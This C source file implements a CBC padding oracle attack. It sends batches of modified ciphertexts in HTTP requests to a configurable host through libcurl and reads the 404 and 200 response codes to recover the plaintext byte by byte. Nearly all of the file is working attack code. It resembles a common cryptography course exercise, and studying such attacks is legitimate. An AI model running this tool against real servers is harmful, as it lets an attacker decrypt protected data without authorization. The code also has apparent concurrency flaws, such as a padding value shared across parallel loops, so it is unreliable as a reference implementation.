#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "PaddingOracle.h"
 
#define HANDLE_COUNT 128
#define BLOCK_SIZE 16
#define TIMEOUT 100000
#define MAX_URL_LEN 256 

typedef struct {
    const char *host_name;
    const char *url_hdr;
    int hdr_len;
    CURLM *multi_handle;
    CURL *curls[HANDLE_COUNT];
} Oracle;
 
char *host_name;
char *url_hdr;
 
Oracle *init_Oracle(const char *host_name, const char *url_hdr); 
void free_Oracle(Oracle *o);
void connection_setup(Oracle *o); 
char recover_byte(Oracle *o, char *url, uint8_t *cipher, char *msg, int size, int byte_num, int pad);
void set_bytes(uint8_t *dst, const char *src, int size);
void hex_encode(char *dst, const uint8_t *src, int size); 
 
Oracle *init_Oracle(const char *host_name, const char *url_hdr) 
{	
    Oracle *o = malloc(sizeof(Oracle));
    o->host_name = host_name;
    o->url_hdr = url_hdr;
    o->hdr_len = strlen(url_hdr);
    o->multi_handle = curl_multi_init();
    connection_setup(o);
    return o;
}

void free_Oracle(Oracle *o) 
{	
    curl_multi_cleanup(o->multi_handle);
    free(o);
}

char *decrypt(const char *hex_cipher) 
{	
    int len = strlen(hex_cipher) / 2;    
    int blocks_num = len / BLOCK_SIZE - 1;
    char *msg = malloc(BLOCK_SIZE * blocks_num + 1);

    int pad = -1;
	
#pragma omp parallel for
    for (int block = blocks_num; block > 0; block--) {	
        Oracle *o = init_Oracle(host_name, url_hdr);

        printf("\nCONNECTED!\n");

        char *url = malloc(MAX_URL_LEN);
        memcpy(url, url_hdr, strlen(url_hdr));

        uint8_t *cipher = malloc((blocks_num + 1) * BLOCK_SIZE);	
        set_bytes(cipher, hex_cipher, BLOCK_SIZE * (1 + blocks_num));

        for (int byte = 1; byte <= BLOCK_SIZE; byte++) {
            char c = recover_byte(o, url, cipher, msg, BLOCK_SIZE * (1 + block), byte, pad);
            if (block == blocks_num) {
                pad = (pad == -1) ? c : pad;
            }
            msg[block * BLOCK_SIZE - byte] = c;
        }
	
        free(url);
        free(cipher);
        free_Oracle(o);
    }
	
    msg[BLOCK_SIZE * blocks_num - pad] = 0;

    return msg;
}

//bytes are numbered from the end
char recover_byte(Oracle *o, char *url, uint8_t *cipher, char *msg, int size, int byte_num, int pad) 
{	
    char guess = 0;
	
    for (int i = 0; i < HANDLE_COUNT; i++) {		
        //do needed xor
        for (int k = 0; k < byte_num - 1; k++) {
            cipher[size - BLOCK_SIZE - k - 1] = cipher[size - BLOCK_SIZE - k - 1] ^ byte_num ^ msg[size - BLOCK_SIZE - k - 1];
        }
        cipher[size - BLOCK_SIZE - byte_num] = cipher[size - BLOCK_SIZE - byte_num] ^ byte_num ^ i;
		
        hex_encode(url + o->hdr_len, cipher, size);
		
        o->curls[i] = curl_easy_init();
        curl_easy_setopt(o->curls[i], CURLOPT_URL, url);
        curl_multi_add_handle(o->multi_handle, o->curls[i]);

        //undo xor to clean up cipher for the next guess
        for (int k = 0; k < byte_num - 1; k++) {
            cipher[size - BLOCK_SIZE - k - 1] = cipher[size - BLOCK_SIZE - k - 1] ^ byte_num ^ msg[size - BLOCK_SIZE - k - 1];
        }
        cipher[size - BLOCK_SIZE - byte_num] = cipher[size - BLOCK_SIZE - byte_num] ^ byte_num ^ i;
    }
	
    int handle_count;
    curl_multi_perform(o->multi_handle, &handle_count);
	
    do {
        int numfds;
        curl_multi_wait(o->multi_handle, NULL, 0, 100000, &numfds);
        curl_multi_perform(o->multi_handle, &handle_count);
    } while (handle_count);
	
    for (int i = 0; i < HANDLE_COUNT; i++) {
        long http_code;
        curl_easy_getinfo(o->curls[i], CURLINFO_RESPONSE_CODE, &http_code);
        if (http_code == 404 || (http_code == 200 && byte_num == pad)) {
            printf("%d %c\n", i, (char) i);
            guess = (char) i;
        }
        curl_multi_remove_handle(o->multi_handle, o->curls[i]);
        curl_easy_cleanup(o->curls[i]);
    }
    return guess;
}

void connection_setup(Oracle *o) 
{	
    int handle_count;
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, o->host_name);
    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L); 
    curl_multi_add_handle(o->multi_handle, curl);
    curl_multi_perform(o->multi_handle, &handle_count);
	
    do {
        int numfds;
        curl_multi_wait(o->multi_handle, NULL, 0, TIMEOUT, &numfds);
        curl_multi_perform(o->multi_handle, &handle_count);
    } while (handle_count);

    curl_multi_remove_handle(o->multi_handle, curl);
    curl_easy_cleanup(curl);
}

void hex_encode(char *dst, const uint8_t *src, int size) 
{    
    for (int i = 0; i < size; i++) {
        sprintf(dst, "%02x", src[i]);
        dst += 2;
    }
}

void set_bytes(uint8_t *dst, const char *src, int size) 
{
    const char *ptr = src;
    for (int i = 0; i < size; i++) {
        sscanf(ptr, "%2hhx", dst + i);
        ptr += 2;
    }
}
